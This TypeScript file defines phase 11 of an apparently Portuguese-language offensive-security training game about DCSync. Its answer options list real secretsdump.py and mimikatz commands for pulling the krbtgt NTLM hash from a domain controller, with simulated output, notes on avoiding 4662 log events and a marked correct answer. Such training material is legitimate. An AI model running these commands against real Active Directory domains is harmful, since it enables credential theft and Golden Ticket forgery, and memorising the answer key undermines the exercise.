import type { PhaseDefinition } from "./types";

export const phase11: PhaseDefinition = {
  number: 11,
  technicalName: "DCSync",
  thematicName: "Replicação maliciosa do segredo krbtgt",
  objective:
    "Executar DCSync direcionado à conta krbtgt usando a conta IAM (Replicating Directory Changes).",
  context: ds =>
    [
      `♻️ DCSync é replicação — só que você fingindo ser um DC. O direito que destrava isso é`,
      `   "Replicating Directory Changes (All)", e adivinha quem tem? A conta de IAM ${ds.dcSyncPrincipal},`,
      `   herdada como subproduto do papel dela em fluxos de provisionamento.`,
      ``,
      `🎯 O alvo claro é krbtgt — não para fazer login (ninguém logga como krbtgt), mas porque a hash NTLM`,
      `   dela é a chave-mestra que cifra todos os TGTs do domínio. Com ela em mãos você forja o Golden Ticket.`,
      ``,
      `🔇 -just-dc-user krbtgt mira um único objeto: 1 evento 4662. Dumpar tudo gera uma cascata`,
      `   de logs e queima a operação. Justificativa obrigatória antes de avançar.`,
      ``,
      `👉 Comando esperado: secretsdump.py`
    ].join("\n"),
  expectedCommand: "secretsdump.py",
  requiresJustification: true,
  options: [
    {
      id: "a",
      text: "secretsdump.py {dom}/{iam}:<senha>@{dc}.{dom} -just-dc-user krbtgt -outputfile krbtgt.txt",
      correct: true,
      response: ds =>
        [
          `[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)`,
          `[*] Using the DRSUAPI method to get NTDS.DIT secrets`,
          `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:${ds.krbtgtHash}:::`,
          ``,
          `[+] Hash de krbtgt capturado: ${ds.krbtgtHash}`
        ].join("\n"),
      scoreDelta: 1.6,
      detectionDelta: 12,
      budgetDelta: -8,
      unlockEvidences: ds => [
        {
          label: "Hash NTLM de krbtgt",
          payload: { account: "krbtgt", ntHash: ds.krbtgtHash, method: "DCSync (DRSUAPI)" }
        }
      ],
      flag: ds => ds.flags.p11
    },
    {
      id: "b",
      text: "secretsdump.py {dom}/{iam}:<senha>@{dc}.{dom}",
      correct: false,
      alternativePath: true,
      response: () =>
        "Dump completo do NTDS.DIT — funciona, mas exfiltra TODOS os hashes e gera muitos 4662 sucessivos.",
      scoreDelta: 0.4,
      detectionDelta: 25,
      budgetDelta: -10
    },
    {
      id: "c",
      text: "secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL",
      correct: false,
      response: () =>
        "Modo offline requer cópia física do NTDS.dit (ntdsutil/snapshot). Não cumpre objetivo nesta fase.",
      scoreDelta: -0.3,
      detectionDelta: 2,
      budgetDelta: -3
    },
    {
      id: "d",
      text: "mimikatz lsadump::dcsync /domain:{dom} /user:krbtgt",
      correct: false,
      alternativePath: true,
      response: ds =>
        [
          `[DC] '${ds.domain}' will be the domain`,
          `[rpc] Service  : ldap`,
          `Object RDN     : krbtgt`,
          `Hash NTLM: ${ds.krbtgtHash}`,
          ``,
          `[!] Funciona em host Windows; mas exige binário Mimikatz no host (alto AV trigger).`
        ].join("\n"),
      scoreDelta: 0.8,
      detectionDelta: 18,
      budgetDelta: -7,
      unlockEvidences: ds => [
        { label: "krbtgt via Mimikatz", payload: { ntHash: ds.krbtgtHash, tool: "mimikatz" } }
      ],
      flag: ds => ds.flags.p11
    },
    {
      id: "e",
      text: "secretsdump.py {dom}/{user-low}:<senha>@{dc}.{dom} -just-dc-user krbtgt",
      correct: false,
      response: () =>
        "Usuário de baixo privilégio não detém Replicating Directory Changes — retorna ACCESS_DENIED e queima a tentativa.",
      scoreDelta: -0.6,
      detectionDelta: 12,
      budgetDelta: -6
    }
  ],
  techExplanation:
    "DCSync abusa do direito Replicating Directory Changes (All). -just-dc-user krbtgt minimiza volume e custo de detecção, mantendo objetivo do Golden Ticket viabilizado."
};
